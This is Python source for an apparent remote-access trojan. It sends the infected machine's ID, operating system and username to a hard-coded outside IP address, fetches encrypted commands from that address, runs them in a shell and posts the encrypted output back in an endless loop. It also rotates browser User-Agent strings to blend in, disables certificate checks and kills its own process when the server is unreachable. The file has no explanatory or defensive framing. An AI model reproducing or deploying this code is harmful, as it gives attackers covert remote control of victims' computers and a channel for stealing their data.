import os, sys, time, uuid, string, requests, subprocess, base64
from base64 import b64decode
from nacl.secret import SecretBox
import nacl.secret
import nacl.utils
from random import choice
from getpass import getuser
from subprocess import Popen, PIPE

d = "185.236.202.218"
#d = "192.168.1.137"

os.environ["TCL_LIBRARY"] = "C:\\Python27\\tcl\\tcl8.5"
os.environ["TK_LIBRARY"]  = "C:\\Python27\\tcl\\tk8.5"
_myuuid_                  = uuid.uuid1()
_sisop_                   = sys.platform
_usu_                     = getuser()

desktop_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) Gecko/20100101 Firefox/50.0",
]


def RATMheaders():
    return {
        "User-Agent": choice(desktop_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }


class BotComand:
    def getControl(self, _p_):
        try:
            _post_fields_ = {"id": _myuuid_, "op": _sisop_, "u": _usu_}
            _respORION_ = requests.post(
                "http://" + d + "/" + _p_ + ".html",
                _post_fields_,
                _timeout_=1,
                _headers_=RATMheaders(),
                verify=False,
            )
            _dat_     = _respORION_.text.split("#")
            _dataurl_ = _dat_[0]
            _dataurl_ = self.BotDCif(_dataurl_)
            _spli_    = _dataurl_.split("#")
            _status_, _timebot_, _proc_, _p1_, _p2_ = (
                _spli_[0],
                _spli_[1],
                _spli_[2],
                _spli_[3],
                _spli_[4],
            )
            return _status_, _timebot_, _proc_, _p1_, _p2_

        except requests.ConnectionError as e:

            if _sisop_ == "linux":
                os.system("killall -9 " + os.path.basename(sys.argv[0]) + "")
            if _sisop_ == "win32":
                os.popen("TASKKILL /F /IM " + os.path.basename(sys.argv[0]) + "")
            if _sisop_ == "win64":
                os.popen("TASKKILL /F /IM " + os.path.basename(sys.argv[0]) + "")

    def PostData(self, _p_, _data_):
        try:
            requests.post(
                "http://" + d + "/" + _p_ + "", _data_, _headers_=RATMheaders(), _timeout_=1
            )
        except:
            print("")

    def TimeBot(self, _tb_):
        time.sleep(int(_tb_))

    def BotCif(self, _datac_):
        _datac_     = str(_datac_)
        secret_key  = "passwordde32bytes123456789876543"
        _nonce_     = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        _str_nonce_ = base64.b64encode(
            _nonce_
        )  # lo convertimos nonceh en str para enviarlo
        _str_nonce_ = _str_nonce_.decode()        # lo convertimos nonceh en str para enviarlo
        _box_       = SecretBox(bytes(secret_key, encoding="utf8"))
        _plain_     = _datac_.encode("utf-8")
        _encrypted_ = base64.b64encode(_box_.encrypt(bytes(_plain_), _nonce_))
        _enc_       = str(_encrypted_)
        _encrypted_ = _enc_[34:-1]  # elimina vector
        _encrypted_ = _str_nonce_ + _encrypted_
        return _encrypted_

    def BotDCif(self, _datad_):
        _da_         = _datad_.split(":")
        _secret_key_ = "passwordde32bytes123456789876543"
        _nonce_      = b64decode(_da_[0])
        _box_        = SecretBox(bytes(_secret_key_, encoding="utf8"))
        _datad_      = b64decode(_da_[1])
        _decrypted_  = _box_.decrypt(_datad_,        _nonce_).decode("utf-8")
        return       _decrypted_


def main():
    print(os.path.basename(sys.argv[0]))
    _process_ = Popen(
        ["pgrep", "-c", os.path.basename(sys.argv[0])], stdout=PIPE, stderr=PIPE
    )
    stdout, stderr = _process_.communicate()
    pro     =      stdout.decode()
    pro     =      int(pro)
    # print(pro)
    if pro > 2:
        sys.exit()
    else:
        try:
            _getCon_ = BotComand()
            _status_, _timebot_, _proc_, _p1_, _p2_ = _getCon_.getControl("paraurl")
            print(_status_, _timebot_, _proc_, _p1_, _p2_)
            if _status_ == "1":
                if _proc_ == "cmd":
                    _out = os.popen(str(_p1_))
                    _data_ = _out.read()
                    _data_ = str.encode(_data_)
                    _data_base64_ = base64.b64encode(_data_)
                    _post_fields_ = {"id": str(_myuuid_), "cmd": _data_base64_}
                    _post_fields_cry_ = _getCon_.BotCif(_post_fields_)
                    _getCon_.PostData("postcom", {"data": _post_fields_cry_})

                    _getCon_.TimeBot(_timebot_)
        except:
            _getCon_.TimeBot(10)


if __name__ == "__main__":
    while True:
        main()
